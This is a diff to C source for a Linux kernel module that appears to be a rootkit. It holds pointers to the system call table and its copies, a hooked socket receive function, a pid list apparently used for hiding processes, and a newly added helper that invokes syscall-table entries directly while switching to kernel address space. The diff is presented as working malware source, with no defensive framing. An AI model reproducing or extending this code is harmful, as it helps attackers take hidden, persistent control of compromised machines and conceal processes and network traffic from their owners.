@@ -41,6 +41,9 @@ LABEL(kernel_start)
 #include <linux/slab.h>
 #include <linux/types.h>
 #include <linux/uaccess.h>
+#include <linux/kallsyms.h>
+
+#include "kernel.h"
 
 /*
  * Macros.
@@ -75,21 +78,22 @@ struct pid_list_node *pid_list_find(pid_t nr);
 /*
  * Global variables.
  */
-void **my_ia32sct;
-void **my_sct;
-void **sys_call_table;
-void **ia32_sys_call_table;
-unsigned int *psct_fastpath;
-unsigned int *psct_slowpath;
-unsigned int *pia32sct;
-struct pid_list_node *pid_list_head;
-struct pid_list_node *pid_list_tail;
-int (*tr_sock_recvmsg)(struct socket *sock, struct msghdr *msg, int flags);
-void * (*f_kmalloc)(size_t size, gfp_t flags);
-void (*f_kfree)(const void *);
-struct pid * (*f_find_vpid)(pid_t nr);
-int (*f_vscnprintf)(char *buf, size_t size, const char *fmt, va_list args);
-int (*f_sys_write)(int fd, const char *mem, size_t len);
+void **my_ia32sct = NULL;
+void **my_sct = NULL;
+void **sys_call_table = NULL;
+void **ia32_sys_call_table = NULL;
+unsigned int *psct_fastpath = NULL;
+unsigned int *psct_slowpath = NULL;
+unsigned int *pia32sct = NULL;
+struct pid_list_node *pid_list_head = NULL;
+struct pid_list_node *pid_list_tail = NULL;
+int (*tr_sock_recvmsg)(struct socket *sock, struct msghdr *msg, int flags) = NULL;
+void * (*f_kmalloc)(size_t size, gfp_t flags) = NULL;
+void (*f_kfree)(const void *) = NULL;
+struct pid * (*f_find_vpid)(pid_t nr) = NULL;
+int (*f_vscnprintf)(char *buf, size_t size, const char *fmt, va_list args) = NULL;
+int (*f_sys_write)(int fd, const char *mem, size_t len) = NULL;
+int (*f_printk)(const char *fmt, ...) = NULL;
 
 /*
  * Hooked function handlers.
@@ -292,12 +296,36 @@ int vpfd(int fd, const char *fmt, va_list args) {
 	textbuf = f_kmalloc(LOG_LINE_MAX, GFP_KERNEL);
 	if (textbuf) {
 		len = f_vscnprintf(textbuf, LOG_LINE_MAX, fmt, args);
-	    old_fs = get_fs();
-	    set_fs(KERNEL_DS);
-		len = f_sys_write(fd, textbuf, len);
+		if (sys_call_table != NULL) {
+			len = KSYSCALL(__NR_write, fd, textbuf, len, 0, 0, 0);
+		} else if (f_sys_write != NULL) {
+			old_fs = get_fs();
+			set_fs(KERNEL_DS);
+			len = f_sys_write(fd, textbuf, len);
+			set_fs(old_fs);
+		}
 		f_kfree(textbuf);
-		set_fs(old_fs);
 		return len;
+	} else {
+		return -1;
+	}
+}
+
+long syscall(void **sct, int nr, bool user, long a1, long a2, long a3, long a4, long a5, long a6) {
+	long (*f)(long, long, long, long, long, long) = NULL, ret = 0;
+	mm_segment_t old_fs;
+
+	if (sct != NULL) {
+		f = sct[nr];
+		if (user) {
+			return f(a1, a2, a3, a4, a5, a6);
+		} else {
+			old_fs = get_fs();
+			set_fs(KERNEL_DS);
+			ret = f(a1, a2, a3, a4, a5, a6);
+			set_fs(old_fs);
+			return ret;
+		}
 	} else {
 		return -1;
 	}
